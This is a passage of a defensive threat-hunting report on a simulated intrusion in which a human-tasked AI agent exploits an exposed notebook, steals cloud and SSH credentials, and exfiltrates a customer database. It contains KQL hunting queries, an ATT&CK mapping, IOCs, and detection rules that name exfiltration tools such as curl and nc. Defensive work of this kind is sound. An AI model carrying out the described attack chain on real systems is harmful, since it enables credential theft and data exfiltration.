## Section 8 – Separating the Attack From Normal Activity

Every malicious action in this intrusion also happened legitimately in the same environment. This section shows how I told them apart.

### Finding 8.1 – `python3.12` processes

- **Finding:** Parent command line `/opt/venv/bin/marimo edit --host 0.0.0.0 --port 2718 --no-token`
- **How I found it:** Of 74 `python3.12` processes on `gf-tg-nb01`, 72 were started from bash by developers, one by systemd, and one by the exposed Marimo service.
- **What I queried:** Counts by `ActingProcessCommandLine` for `python3.12`.
- **Why it matters:** Parent lineage gives a detection that works no matter what payload the attacker runs.
- **Lesson:** Alerting on every Python process would be unusable. The same binary becomes meaningful through its parent. (Evidence: Finding 1.4.)

**Query:**

```kusto
LinuxProcess_CL
| where TimeGenerated between (datetime(2026-09-04T00:00:00Z) .. datetime(2026-09-05T00:00:00Z))
| where Dvc == "gf-tg-nb01" and TargetProcessName == "python3.12"
| summarize Processes=count() by ActingProcessCommandLine
| order by Processes desc
```

### Finding 8.2 – Metadata-service reads

- **Finding:** `ActingProcessName = python3.12`
- **How I found it:** Of 86 connections to `169.254.169.254`, 85 came from the routine credential-helper daemon and one from `python3.12`.
- **What I queried:** Metadata-service connections summarized by the process that owned the socket.
- **Why it matters:** Destination and protocol were normal. Only the process was unusual.
- **Lesson:** Metadata reads are routine. Baseline which processes make them. (Evidence: Finding 2.2.)

**Query:**

```kusto
LinuxNetwork_CL
| where TimeGenerated between (datetime(2026-09-04T00:00:00Z) .. datetime(2026-09-05T00:00:00Z))
| where DstIpAddr == "169.254.169.254"
| summarize Connections=count() by ActingProcessName
| order by Connections desc
```

### Finding 8.3 – Secret reads

- **Finding:** Source `203.0.113.142` combined with the bastion deploy-key target
- **How I found it:** All 22 successful `GetSecretValue` calls that day looked alike at first: same result, same `ReadOnly` value, and the same `python-httpx/0.27.0` user agent. Twenty-one came from the `notebook-app` role at internal address `10.6.0.12`. One came from `svc-notebook` at an external address, and agent telemetry ties that call to the bastion deploy key (Finding 4.1).
- **What I queried:** All successful secret reads, compared by source, identity, user agent, and target.
- **Why it matters:** No single field separated the theft. The combination of source network and target did.
- **Lesson:** Identity fields showed the same 21-to-1 split. When several fields agree, I report the one that answers the question most directly and use the others as confirmation.

**Query:**

```kusto
AWSCloudTrail
| where TimeGenerated between (
    datetime(2026-09-04T00:00:00Z) ..
    datetime(2026-09-05T00:00:00Z)
)
| where EventName == "GetSecretValue"
| project
    TimeGenerated,
    UserIdentityArn,
    UserIdentityAccessKeyId,
    SourceIpAddress,
    UserAgent,
    ReadOnly,
    RequestParameters,
    ErrorCode
| order by TimeGenerated asc
```

*Result: The one external svc-notebook call among routine notebook-app reads from 10.6.0.12.*

**Query:**

```kusto
AWSCloudTrail
| where TimeGenerated between (
    datetime(2026-09-04T00:00:00Z) ..
    datetime(2026-09-05T00:00:00Z)
)
| where EventName == "GetSecretValue"
| extend Kind = iff(
    UserIdentityArn == "arn:aws:iam::402913776148:user/svc-notebook",
    "THEFT",
    "ROUTINE"
)
| summarize
    Calls=count(),
    IdentityTypes=make_set(UserIdentityType),
    ARNs=make_set(UserIdentityArn),
    UserAgents=make_set(UserAgent),
    AccessKeys=make_set(UserIdentityAccessKeyId),
    SessionIssuers=make_set(SessionIssuerArn),
    Requests=make_set(RequestParameters),
    ResourcesSeen=make_set(Resources)
    by Kind
```

*Result: The pivot separates 21 routine calls from one theft call.*

**Query:**

```kusto
AWSCloudTrail
| where TimeGenerated between (
    datetime(2026-09-04T00:00:00Z) ..
    datetime(2026-09-05T00:00:00Z)
)
| where EventName == "GetSecretValue"
| extend Kind = iff(
    UserIdentityArn == "arn:aws:iam::402913776148:user/svc-notebook",
    "THEFT",
    "ROUTINE"
)
| summarize
    Calls = count(),
    UserAgents = make_set(UserAgent),
    IdentityTypes = make_set(UserIdentityType),
    ARNs = make_set(UserIdentityArn)
    by Kind
```

*Result: Both groups use python-httpx/0.27.0, so the user agent alone can't separate them.*

**Query:**

```kusto
let Values =
AWSCloudTrail
| where TimeGenerated between (
    datetime(2026-09-04T00:00:00Z) ..
    datetime(2026-09-05T00:00:00Z)
)
| where EventName == "GetSecretValue"
| extend R = pack_all()
| mv-expand K = bag_keys(R)
| extend
    Field = tostring(K),
    Value = tostring(R[tostring(K)])
| where Field !in (
    "TimeGenerated",
    "AwsEventId",
    "AwsRequestId",
    "AwsRequestId_",
    "SourceIpAddress"
)
| summarize Calls=count() by Field, Value;

Values
| summarize
    VariantCount=dcount(Value),
    MinCalls=min(Calls),
    MaxCalls=max(Calls),
    Variants=make_list(strcat(Value, "  =>  ", Calls))
    by Field
| where VariantCount == 2
| where MinCalls == 1 and MaxCalls == 21
| order by Field asc
```

*Result: Identity fields show the same 21-to-1 split.*

### Finding 8.4 – Pace of the attack

- **Finding:** Continuous. 35 minutes 49 seconds from exploit to exfiltration; the agent session spanned 52 minutes (11:05–11:57).
- **How I found it:** Ordering the malicious events showed initial access, credential theft, cloud reconnaissance, secret theft, SSH, discovery, collection, and exfiltration with no human-scale pauses.
- **What stood out:** Routine activity was spread across the workday. The attack was one dense cluster of related events.
- **Why it matters:** Speed and density are useful signals for agent-driven attacks, and they leave defenders very little time to respond by hand.
- **Lesson:** Pace alone doesn't prove an agent was involved. Here it is combined with explicit tasking and the model's own reasoning. (Evidence and query: Finding 7.1 session summary.)

## Evidence validation and query corrections

When projected fields came back empty, I checked the full packed records to confirm whether the value existed in the ingested event at all. These views confirmed the Secrets Manager sequence and the complete `GetSecretValue` record, but no secret material, which is expected.

**Query:**

```kusto
AWSCloudTrail
| where TimeGenerated between (
    datetime(2026-09-04T11:23:00Z) ..
    datetime(2026-09-04T11:31:30Z)
)
| where UserIdentityAccessKeyId == "AKIA4TIDEGLASS0EXAMPLE"
| where EventName in ("DescribeSecret", "GetSecretValue")
| extend FullRecord = tostring(pack_all())
| project TimeGenerated, EventName, SourceIpAddress, FullRecord
| order by TimeGenerated asc
```

*Result: Packed records preserve the original event context.*

**Query:**

```kusto
AWSCloudTrail
| where TimeGenerated between (
    datetime(2026-09-04T11:11:00Z) ..
    datetime(2026-09-04T11:32:00Z)
)
| where UserIdentityAccessKeyId == "AKIA4TIDEGLASS0EXAMPLE"
| where EventSource == "secretsmanager.amazonaws.com"
| extend FullRecord = tostring(pack_all())
| project TimeGenerated, EventName, FullRecord
| order by TimeGenerated asc
```

*Result: The full-record timeline independently confirms the ListSecrets, DescribeSecret, and GetSecretValue sequence.*

My first CVE query projected `tool_args`, a column that doesn't exist in this custom table, and Log Analytics returned a semantic error. I fixed it by adding a time filter and projecting only fields confirmed by `getschema` (the corrected query is in Finding 1.2). I kept the error to document the correction, not as evidence for any finding.

**Query (failed as expected: `tool_args` does not exist):**

```kusto
LLMAgentLogs_CL
| where model_response contains "CVE-"
| project
    TimeGenerated,
    actor,
    session_id,
    model_response,
    tool_name,
    tool_args
| order by TimeGenerated asc
```

*Result (troubleshooting only): this error documents a schema correction.*

The SSH command in Finding 5.1 ran as PID 5214, launched by python3.12 PID 5211, which ties the lateral movement back to the original exploit process.

## MITRE ATT&CK and ATLAS mapping

Each observed behavior mapped to MITRE ATT&CK, plus the ATLAS classification from Finding 2.3.

| Tactic | Behavior | Technique |
|---|---|---|
| Initial Access | Exploit of the exposed Marimo kernel | `T1190` Exploit Public-Facing Application |
| Execution | Python payload in the kernel | `T1059.006` Command and Scripting Interpreter: Python |
| Credential Access | EC2 metadata credential theft | `T1552.005` Unsecured Credentials: Cloud Instance Metadata API |
| Credential Access | Agent used its own tool to harvest credentials | ATLAS `AML.T0098` AI Agent Tool Credential Harvesting (Realized) |
| Defense Evasion | Use of the stolen `svc-notebook` key | `T1078.004` Valid Accounts: Cloud Accounts |
| Discovery | `ListSecrets` and `DescribeSecret` enumeration | `T1526` Cloud Service Discovery |
| Command and Control | Rotating egress to avoid throttling | `T1090.003` Proxy: Multi-hop Proxy |
| Credential Access | Secrets Manager key retrieval | `T1555.006` Credentials from Password Stores: Cloud Secrets Management Stores |
| Credential Access | Private key staged in `/tmp/.c/id_ed25519` and loaded for SSH | `T1552.001` Unsecured Credentials: Credentials In Files |
| Lateral Movement | SSH to the bastion with the stolen key | `T1021.004` Remote Services: SSH |
| Discovery | Locating the database subnet and PostgreSQL service from the bastion | `T1046` Network Service Discovery |
| Collection | Table enumeration and `pg_dump` of `customers` | `T1213` Data from Information Repositories |
| Collection | Dump staged through the bastion | `T1005` Data from Local System |

**Account use, compression, and transfer.** These techniques cover the final steps of the chain.

| Tactic | Behavior | Technique |
|---|---|---|
| Lateral Movement | Login as the `deploy` service account | `T1078.003` Valid Accounts: Local Accounts |
| Collection | `gzip` compression in the pipeline | `T1560.001` Archive Collected Data: Archive via Utility |
| Exfiltration | `curl` over HTTPS to an external host | `T1048.002` Exfiltration Over Asymmetric Encrypted Non-C2 Protocol |

**Mapping notes.** The data came from a remote database server, so `T1213` describes the dump most precisely; `T1005` is included because the output passed through the bastion before transfer. For the key file, `T1552.004` (Private Keys) also applies.

## Indicators of compromise

| Type | Indicator | Role |
|---|---|---|
| IP | `198.51.100.23` | Initial-access source |
| IP | `203.0.113.71`, `.94`, `.118`, `.142`, `.167`, `.203` | Egress pool for AWS API calls |
| IP:port | `203.0.113.41:8443` | Exfiltration destination |
| AWS access key | `AKIA4TIDEGLASS0EXAMPLE` | Stolen `svc-notebook` credential |
| IAM identity | `arn:aws:iam::402913776148:user/svc-notebook` | Compromised principal |
| Secret | `prod/bastion/ssh-deploy-key` | Stolen SSH key |
| File | `/tmp/.c/id_ed25519` | Stolen key written to disk |
| SSH fingerprint | `ED25519 SHA256:mNq7xR2vTbY8kLpJ4wZaHc1oUeVgX5tDsQiFj0rWnAE` | Stolen deploy key |
| Agent session | `tg-4b81e0d7` | Malicious agent session |

## Detection engineering

I turned the investigation's findings into eight behavior-based detections. Each targets behavior rather than the specific indicators above, so it still works when the attacker changes infrastructure. Draft KQL for detections 1–5 and 7 is below; thresholds would need tuning against each environment's baseline before production use.

| # | Detection | Signal | Noise it avoids |
|---|---|---|---|
| 1 | External WebSocket to a notebook kernel, followed by a new interpreter | `ApacheAccess_CL` + `LinuxProcess_CL` within 60 s | Internal kernel traffic |
| 2 | Interpreter spawned by a no-token notebook service | Parent command line contains `--no-token` | 72 developer one-liners |
| 3 | Metadata-service access by an unexpected process | Socket owner not in the credential-helper allowlist | 85 routine daemon reads |
| 4 | One access key from multiple public IPs, especially after throttling | ≥3 distinct public IPs per key in 10 min | Stable-address CI and roles |
| 5 | Interactive login by a service account | `deploy`-type accounts with successful SSH | 317 admin key-based logins |
| 6 | `GetSecretValue` on SSH or deploy secrets from an external source | Secret name pattern + non-estate IP | Internal role reads |
| 7 | `pg_dump` piped to a network tool | Shell history `pg_dump` + `curl`/`nc`/`wget` | Nightly `pgbackup` job |
| 8 | Multi-stage chain compressed into under an hour | Correlation across detections 1–7 on shared entities | Isolated single alerts |

<details>
<summary><b>Draft detection KQL (click to expand)</b></summary>

**D1. External WebSocket to a notebook kernel, followed by a new process under the notebook service.**

```kusto
let window = 60s;
ApacheAccess_CL
| where TimeGenerated > ago(1d)
| where UriStem has "/ws/kernel" and tostring(HttpStatus) == "101"
| where isnotempty(parse_ipv4(ClientIP)) and not(ipv4_is_private(ClientIP))
| project UpgradeTime = TimeGenerated, Host = Computer, ClientIP
| join kind=inner (
    LinuxProcess_CL
    | where TimeGenerated > ago(1d)
    | where ActingProcessCommandLine has_any ("marimo", "jupyter")
    | project ProcTime = TimeGenerated, Host = Dvc, TargetProcessName, TargetProcessId,
              TargetProcessCommandLine, ActingProcessCommandLine
  ) on Host
| where ProcTime between (UpgradeTime .. UpgradeTime + window)
| project UpgradeTime, ProcTime, Host, ClientIP, TargetProcessName, TargetProcessId,
          TargetProcessCommandLine, ActingProcessCommandLine
```

**D2. Any child process of a notebook server running without authentication.**

```kusto
LinuxProcess_CL
| where TimeGenerated > ago(1d)
| where ActingProcessCommandLine has "--no-token"
      and ActingProcessCommandLine has_any ("marimo", "jupyter")
| project TimeGenerated, Dvc, TargetProcessName, TargetProcessId, TargetProcessCommandLine,
          ActingProcessId, ActingProcessCommandLine
```

**D3. Metadata-service access by a process that rarely makes it.**

```kusto
let lookback = 14d;
let rare_threshold = 5;
LinuxNetwork_CL
| where TimeGenerated > ago(lookback)
| where DstIpAddr == "169.254.169.254"
| summarize Connections = count(), Hosts = make_set(Dvc), Pids = make_set(ActingProcessId),
            FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated)
            by ActingProcessName
| where Connections < rare_threshold
| order by LastSeen desc
```

**D4. One access key used from several public IPs in a short window, with throttling as a booster.**

```kusto
AWSCloudTrail
| where TimeGenerated > ago(1d)
| where isnotempty(UserIdentityAccessKeyId)
| where isnotempty(parse_ipv4(SourceIpAddress)) and not(ipv4_is_private(SourceIpAddress))
| summarize PublicIPs = dcount(SourceIpAddress), IPs = make_set(SourceIpAddress),
            Throttles = countif(ErrorCode has "Throttl"), Events = make_set(EventName),
            FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated)
            by UserIdentityAccessKeyId, UserIdentityArn, bin(TimeGenerated, 10m)
| where PublicIPs >= 3
| extend Severity = iff(Throttles > 0, "High", "Medium")
```

**D5. Successful interactive login by a service account.**

```kusto
let service_accounts = dynamic(["deploy", "pgbackup"]);
LinuxAuth_CL
| where TimeGenerated > ago(1d)
| where EventResult =~ "Success"
| where TargetUsername in~ (service_accounts)
| project TimeGenerated, TargetUsername, EventOriginalMessage
```

**D7. Database dump piped directly to a network transfer tool.**

```kusto
LinuxShellHistory_CL
| where TimeGenerated > ago(1d)
| where Command has "pg_dump"
      and Command has_any ("curl", "wget", "nc ", "ncat", "socat", "scp")
| project TimeGenerated, ShellUser, Command
```

</details>

## Containment and remediation

1. **Close the entry point.** Remove external access to the Marimo service, require authentication, and patch `CVE-2026-39987`.
2. **Revoke cloud credentials.** Deactivate `AKIA4TIDEGLASS0EXAMPLE`, review all `svc-notebook` activity, and cut its permissions to what the notebook needs. Requiring IMDSv2 is good hygiene but would not have stopped code already running on the host, so also restrict which processes can reach `169.254.169.254`.
3. **Rotate the SSH key.** Rotate `prod/bastion/ssh-deploy-key`, remove it from every `authorized_keys` file, and search all hosts for the fingerprint above.
4. **Restrict the service account.** Disable interactive login for `deploy` and review `gf-tg-bastion01` for persistence.
5. **Block by role.** Block the staging, egress-pool, and exfiltration addresses, keeping in mind each served a different purpose.
6. **Assess the breach.** Treat 2,841,902 `customers` rows as the exposed scope and begin applicable breach-notification procedures.
7. **Treat agent logs as security telemetry.** Retain agent reasoning and tool-use logs, restrict access to them, and alert on credential-harvesting or exfiltration intent. The agent's policy gate allowed the key-storage action because no policy matched, so add deny-by-default rules for credential handling.

## Visibility gaps and confidence

- **High confidence:** Entry point, source address, process lineage, stolen identity and key, egress rotation, secret retrieval time, SSH account and fingerprint, database target and row count, exfiltration command and destination, and the malicious agent session.
- **Secret name comes from agent telemetry.** CloudTrail's `SecretId` was blank in this workspace, so the name comes from the agent's own log, correlated to the CloudTrail event by time and source.
- **Transfer volume not observed.** The shell command and the database `COPY` prove the data was read and piped to `curl`. No network flow record in the available data shows how many bytes reached `203.0.113.41`. The report treats all 2,841,902 rows as exposed.
- **Secret contents not recoverable.** CloudTrail management events record that `GetSecretValue` happened and version metadata such as `VersionId`, not what it returned.
- **Timestamps.** Shell history logged the exfiltration command at 11:40:49, four seconds after PostgreSQL logged the `COPY`, consistent with history being written as the command completes. I use the database log as the authoritative collection time.
- **Operator not identified.** "Human-tasked" describes how the attack ran. It does not identify the person who gave the instruction.

## Conclusion

TideGlass is a confirmed end-to-end compromise carried out by an AI agent working from a single human instruction, from exploit to exfiltration in under 36 minutes. The strongest result is the causal chain across eight telemetry sources: a public application exploit, interpreter lineage, metadata credential theft, one key across rotating egress, secret retrieval, SSH key reuse, database-side confirmation, and an external transfer pipeline.

The investigation also shows why context matters. Python execution, metadata reads, key-based SSH, and successful secret reads all happened legitimately in this environment. What separated the attack was process lineage, the combination of source and target, a service account behaving like a person, and the speed of the chain.

## Appendix A – Exploratory queries

These queries tested whether the secret name or contents were recorded anywhere else. They returned no data or blank fields, which is what supports the visibility gaps in Finding 4.3. I kept them to show how I ruled those sources out.

**A1. Search the notebook host's shell history for AWS CLI secret retrieval (no results: the key was retrieved through the Python SDK, not the CLI)**

```kusto
LinuxShellHistory_CL
| where TimeGenerated between (
    datetime(2026-09-04T11:30:00Z) ..
    datetime(2026-09-04T11:32:00Z)
)
| where Command has_any (
    "secretsmanager",
    "get-secret-value",
    "secret-id",
    "bastion",
    "deploy"
)
| project TimeGenerated, Computer, ShellUser, Command
| order by TimeGenerated asc
```

**A2. Search process command lines for the same retrieval (no results)**

```kusto
LinuxProcess_CL
| where TimeGenerated between (
    datetime(2026-09-04T11:30:00Z) ..
    datetime(2026-09-04T11:32:00Z)
)
| where TargetProcessCommandLine has_any (
    "secretsmanager",
    "get-secret-value",
    "secret-id",
    "bastion",
    "deploy"
)
| project
    TimeGenerated,
    Dvc,
    TargetProcessName,
    TargetProcessId,
    TargetProcessCommandLine,
    ActingProcessName,
    ActingProcessId
| order by TimeGenerated asc
```

**A3. Look for the secret name anywhere in the packed CloudTrail records**

```kusto
AWSCloudTrail
| where TimeGenerated between (
    datetime(2026-09-04T11:22:30Z) ..
    datetime(2026-09-04T11:31:30Z)
)
| where UserIdentityAccessKeyId == "AKIA4TIDEGLASS0EXAMPLE"
| where EventSource == "secretsmanager.amazonaws.com"
| extend FullRecord = tostring(pack_all())
| where FullRecord has_any ("bastion", "deploy", "ssh", "key")
| extend Context = extract(@"(.{0,150}(bastion|deploy|ssh|key).{0,150})", 1, FullRecord)
| project
    TimeGenerated,
    EventName,
    SourceIpAddress,
    Context
| order by TimeGenerated asc
```

**A4. Inspect every column of the GetSecretValue event**

```kusto
AWSCloudTrail
| where TimeGenerated == datetime(2026-09-04T11:31:16Z)
| where EventName == "GetSecretValue"
| project *
```

**A5. Check the resource and payload columns directly**

```kusto
AWSCloudTrail
| where TimeGenerated == datetime(2026-09-04T11:31:16Z)
| where EventName == "GetSecretValue"
| project
    TimeGenerated,
    EventName,
    Resources,
    AdditionalEventData,
    RequestParameters,
    ResponseElements
```

**A6. Parse the Resources array**

```kusto
AWSCloudTrail
| where TimeGenerated == datetime(2026-09-04T11:31:16Z)
| where EventName == "GetSecretValue"
| extend R = parse_json(Resources)
| project
    TimeGenerated,
    Resources,
    Resource0 = tostring(R[0]),
    Resource1 = tostring(R[1])
```

**A7. Cast the same columns to strings to rule out a display problem**

```kusto
AWSCloudTrail
| where TimeGenerated == datetime(2026-09-04T11:31:16Z)
| where EventName == "GetSecretValue"
| project
    Resources = tostring(Resources),
    AdditionalEventData = tostring(AdditionalEventData),
    RequestParameters = tostring(RequestParameters),
    ResponseElements = tostring(ResponseElements)
```

**A8. Search agent records around the retrieval for secret and bastion context**

```kusto
LLMAgentLogs_CL
| where TimeGenerated between (
    datetime(2026-09-04T11:30:00Z) ..
    datetime(2026-09-04T11:32:00Z)
)
| extend FullRecord = tostring(pack_all())
| where FullRecord has_any ("bastion", "deploy", "ssh", "private")
| project TimeGenerated, FullRecord
| order by TimeGenerated asc
```

**A9. Project RequestParameters alone for the GetSecretValue event**

```kusto
AWSCloudTrail
| where TimeGenerated between (
    datetime(2026-09-04T11:31:00Z) ..
    datetime(2026-09-04T11:31:30Z)
)
| where UserIdentityAccessKeyId == "AKIA4TIDEGLASS0EXAMPLE"
| where EventName == "GetSecretValue"
| project
    TimeGenerated,
    RequestParameters
```

---

*This investigation was performed in a simulated enterprise environment built for threat-hunting practice. IP addresses use RFC 5737 documentation ranges, and all account identifiers are fictional.*
